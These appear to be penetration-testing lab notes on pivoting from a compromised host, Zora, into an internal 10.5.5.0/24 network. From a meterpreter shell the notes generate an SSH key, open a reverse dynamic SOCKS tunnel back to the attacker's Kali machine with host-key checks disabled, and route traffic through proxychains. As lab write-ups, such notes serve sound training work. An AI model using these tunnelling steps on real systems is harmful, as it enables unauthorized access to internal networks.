Similar to when we had un-priv shell access to Ajla via the www-data user, we can't use a standard SSH connection for Zora usin gthe mysql account since user doesn't have shell  access by default.

We could create a ssh tunnel similar to the one used on Ajla, but we could also leverage the fact that Zora is running a recent version of Alpine, which has a newer version of SSH client that allows us to establish a very userful type of tunnel via "reverse dynamic port forwarding".

Check ssh version:
`ssh -V`
OpenSSH_8.1p1, OpenSSL 1.1.1d 10 Sep 2019

This should support the previously mentioned feature.

If we can get this to work, we will have full network access to the 10.5.5.0/24 sandbox internal network through a SOCKS proxy running on our Kali machine.

Since we only have access to a meterpreter shell, we need to create a new ssh key on Zora and run teh client in a way that doesn't require interaction.

Generate an SSH key on Zora:
meterpreter>
`ssh-keygen`
`cat /var/lib/mysql/.ssh/id_rsa.pub`
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4cjmvS... mysql@zora

Set up authorized_keys file on kali with same restrictions we used earlier:
Kali>
```
from="10.11.1.250",command="echo 'This account can only be used for port
forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABgQC4cjmvS... mysql@zora
```

From IP does not change since traffic is still coming from external firewall as far as Kali is concerned. 

SSH command DOES need to change:
- We don't need multiple remote port forwarding options
- Just one port forward: -R 1080
- By not including host after port, SSH is instructed to create a SOCKS proxy on our Kali server.
- We also need to change the location of the private key

SSH command for reverse dynamic port forwarding:
meterpreter>
`ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i
/var/lib/mysql/.ssh/id_rsa kali@10.11.0.4`

This will initiate the SSH connectino to our kali machine.

Double check the port was opened on Kali:
Kali>
`sudo netstat -tulpn`
```
...
tcp 0 0 127.0.0.1:1080 0.0.0.0:* LISTEN 99765/sshd: kali
...
tcp6 0 0 ::1:1080 :::* LISTEN 99765/sshd: kali
...
```

With dynamic reverse tunnel established, we can configure proxychains on Kali to use the SOCKS proxy. 

Edit /etc/proxychains.conf and edit last line:
`socks4 127.0.0.1 1080`

At this point, we should have stable tunnel access to 10.5.5.0/24 network and can move to the next target: Poultry (that we discovered in teh share mounted on Zora).





